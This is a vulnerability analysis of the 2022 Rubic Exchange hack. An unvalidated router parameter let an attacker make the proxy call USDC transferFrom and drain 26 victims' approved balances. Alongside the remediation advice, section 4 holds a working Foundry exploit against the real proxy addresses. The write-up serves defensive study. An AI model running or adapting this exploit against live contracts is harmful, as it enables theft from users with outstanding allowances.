# Rubic — routerCallNative() Arbitrary Call Attack: USDC Theft from Victims Analysis

| Field | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | Rubic Exchange |
| **Chain** | Ethereum |
| **Loss** | Unconfirmed (26 victims) |
| **Rubic Proxy 1** | [0x3335A88bb18fD3b6824b59Af62b50CE494143333](https://etherscan.io/address/0x3335A88bb18fD3b6824b59Af62b50CE494143333) |
| **Rubic Proxy 2** | [0x33388CF69e032C6f60A420b37E44b1F5443d3333](https://etherscan.io/address/0x33388CF69e032C6f60A420b37E44b1F5443d3333) |
| **USDC** | [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48](https://etherscan.io/address/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) |
| **Integrator** | [0x677d6EC74fA352D4Ef9B1886F6155384aCD70D90](https://etherscan.io/address/0x677d6EC74fA352D4Ef9B1886F6155384aCD70D90) |
| **Root Cause** | The `router` parameter in `routerCallNative()` is not validated, allowing an attacker to set the USDC contract as the `router` and inject a `transferFrom()` encoding into `data`, enabling arbitrary theft of victims' USDC |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/Rubic_exp.sol) |

---
## 1. Vulnerability Overview

Rubic was a DEX aggregator supporting cross-chain swaps. The `routerCallNative()` function was designed to call external DEX routers to execute swaps, but the `router` address and `data` payload could be specified arbitrarily by the caller. The attacker targeted 26 victims who had already granted USDC spending allowances to the Rubic Proxy, set `router` to the USDC contract address, encoded `data` as `transferFrom(victim, attacker, balance)`, and called `routerCallNative()`. The Rubic Proxy executed USDC's `transferFrom` as if calling a DEX, transferring victims' USDC to the attacker. No flash loan was required — the attack was carried out solely by abusing existing allowances.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Rubic Proxy - no router address validation
contract RubicProxy1 {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;  // ❌ Unvalidated router address
    }

    // ❌ router can be set to an arbitrary address (e.g., USDC)
    function routerCallNative(
        BaseCrossChainParams calldata params,
        bytes calldata data  // ❌ Arbitrary calldata allowed
    ) external payable {
        // ❌ Does not block router being a token contract
        // ❌ Does not block data being transferFrom()
        require(params.router != address(0), "Zero router");
        // ❌ Missing: require(_isWhitelistedRouter(params.router), "Not whitelisted");

        // ❌ Proxy contract executes USDC.transferFrom(victim, attacker, amount)
        (bool success,) = params.router.call{value: msg.value}(data);
        require(success, "Router call failed");
    }
}

// ✅ Correct pattern - router whitelist + data validation
contract SafeRubicProxy {
    mapping(address => bool) public whitelistedRouters;
    bytes4 private constant TRANSFER_FROM_SELECTOR = bytes4(keccak256("transferFrom(address,address,uint256)"));
    bytes4 private constant TRANSFER_SELECTOR = bytes4(keccak256("transfer(address,uint256)"));

    function routerCallNative(
        BaseCrossChainParams calldata params,
        bytes calldata data
    ) external payable {
        // ✅ Only whitelisted routers can be called
        require(whitelistedRouters[params.router], "Router not whitelisted");

        // ✅ Block dangerous function selectors
        bytes4 selector = bytes4(data[:4]);
        require(selector != TRANSFER_FROM_SELECTOR, "transferFrom not allowed");
        require(selector != TRANSFER_SELECTOR, "transfer not allowed");

        (bool success,) = params.router.call{value: msg.value}(data);
        require(success, "Router call failed");
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompilation


**Rubic_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: The `router` parameter in `routerCallNative()` is not validated, allowing the USDC contract to be specified as `router` and a `transferFrom()` encoding to be inserted into `data`
    function routerCallNative((address,uint256,uint256,address,uint256,address,address,address) arg0, bytes arg1) external view returns (uint256) {}  // 0x0b6b2d42  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[Preparation] Collect list of 26 victims who have granted USDC allowance to Rubic Proxy
    │         (existing approve() calls from legitimate Rubic users)
    │
    ├─[Victims 1~8] Call Rubic Proxy1.routerCallNative():
    │     params.router = USDC contract address
    │     data = transferFrom(victim1, attacker, victim1_balance)
    │     ❌ No router validation
    │     ❌ Rubic Proxy1 executes USDC.transferFrom(victim1, attacker, N)
    │     → victim1's USDC → attacker
    │
    ├─[Victims 9~26] Call Rubic Proxy2.routerCallNative():
    │     params.router = USDC contract address (same pattern)
    │     data = transferFrom(victimN, attacker, victimN_balance)
    │     → 18 victims' USDC → attacker
    │
    └─[Result] Full USDC balance drained from all 26 victims
              No flash loan needed — existing allowances exploited
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IRubicProxy1 {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }
    function routerCallNative(
        BaseCrossChainParams calldata params,
        bytes calldata data
    ) external payable;
}

interface IRubicProxy2 {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        string providerInfo;
        address router;
    }
    function routerCallNative(
        string calldata providerInfo,
        BaseCrossChainParams calldata params,
        bytes calldata data
    ) external payable;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract RubicExploit is Test {
    IRubicProxy1 proxy1    = IRubicProxy1(0x3335A88bb18fD3b6824b59Af62b50CE494143333);
    IRubicProxy2 proxy2    = IRubicProxy2(0x33388CF69e032C6f60A420b37E44b1F5443d3333);
    IERC20       USDC      = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address      integrator = 0x677d6EC74fA352D4Ef9B1886F6155384aCD70D90;

    // List of victim addresses (users who granted USDC allowance to Rubic Proxy)
    address[26] victims;

    function setUp() public {
        vm.createSelectFork("mainnet", 16_260_580);
        // Initialize victim addresses (in the actual attack, collected via on-chain events)
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDC", USDC.balanceOf(address(this)), 6);

        // [Victims 1~8] Attack via Rubic Proxy1
        for (uint256 i = 0; i < 8; i++) {
            address victim = victims[i];
            uint256 amount = USDC.allowance(victim, address(proxy1));
            if (amount == 0) continue;
            amount = min(amount, USDC.balanceOf(victim));
            if (amount == 0) continue;

            // ⚡ router = USDC contract, data = transferFrom(victim, attacker, amount)
            IRubicProxy1.BaseCrossChainParams memory params = IRubicProxy1.BaseCrossChainParams({
                srcInputToken: address(USDC),
                srcInputAmount: 0,
                dstChainID: 1,
                dstOutputToken: address(USDC),
                dstMinOutputAmount: 0,
                recipient: address(this),
                integrator: integrator,
                router: address(USDC)  // ❌ USDC designated as router
            });
            // ❌ Encode transferFrom(victim, attacker, amount)
            bytes memory data = abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                victim, address(this), amount
            );
            proxy1.routerCallNative(params, data);
        }

        // [Victims 9~26] Attack via Rubic Proxy2
        for (uint256 i = 8; i < 26; i++) {
            address victim = victims[i];
            uint256 amount = USDC.allowance(victim, address(proxy2));
            if (amount == 0) continue;
            amount = min(amount, USDC.balanceOf(victim));
            if (amount == 0) continue;

            IRubicProxy2.BaseCrossChainParams memory params = IRubicProxy2.BaseCrossChainParams({
                srcInputToken: address(USDC),
                srcInputAmount: 0,
                dstChainID: 1,
                dstOutputToken: address(USDC),
                dstMinOutputAmount: 0,
                recipient: address(this),
                integrator: integrator,
                providerInfo: "",
                router: address(USDC)
            });
            bytes memory data = abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                victim, address(this), amount
            );
            proxy2.routerCallNative("", params, data);
        }

        emit log_named_decimal_uint("[End] USDC", USDC.balanceOf(address(this)), 6);
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Unvalidated `router` parameter in `routerCallNative()` → arbitrary contract call |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Arbitrary External Call Vulnerability |
| **Attack Vector** | `routerCallNative(router=USDC, data=transferFrom(victim, attacker, N))` × 26 victims |
| **Preconditions** | No router address whitelist in `routerCallNative()`, victims had already approved USDC to Rubic Proxy |
| **Impact** | USDC drained from 26 victims |

---
## 6. Remediation Recommendations

1. **Router Whitelist**: Apply a whitelist in `routerCallNative()` so that only approved DEX router addresses can be used as `router`, and explicitly block token contract addresses.
2. **Block Dangerous Function Selectors**: Immediately revert if the first 4 bytes of `data` match token transfer function selectors such as `transferFrom`, `transfer`, or `approve`.
3. **Minimize Proxy Allowance**: Introduce a `permit`-based or `safeApprove` pattern that restricts the allowance users grant to the Rubic Proxy to only the exact amount required for each swap.
4. **Input Validation Layer**: DEX aggregators must perform two-stage validation before calling external routers: verify that `router` is on the internal whitelist, and verify that `data` uses an allowed function selector.

---
## 7. Lessons Learned

- **Structural Risk of DEX Aggregators**: DEX aggregators are designed to flexibly call external contracts, which makes them vulnerable to arbitrary call exploits if implemented incorrectly. The `router` parameter must always be restricted via a whitelist.
- **Danger of Existing Allowances**: The attack was completed without a flash loan, exploiting only allowances that victims had previously granted. It is important to develop the habit of revoking leftover allowances immediately after using a DEX.
- **Same Pattern as TransitSwap (2022-10)**: TransitSwap suffered ~$21M in losses due to the identical unvalidated caller parameter pattern in `claimTokens()`. Arbitrary external call vulnerabilities in DEX aggregators are a recurring pattern.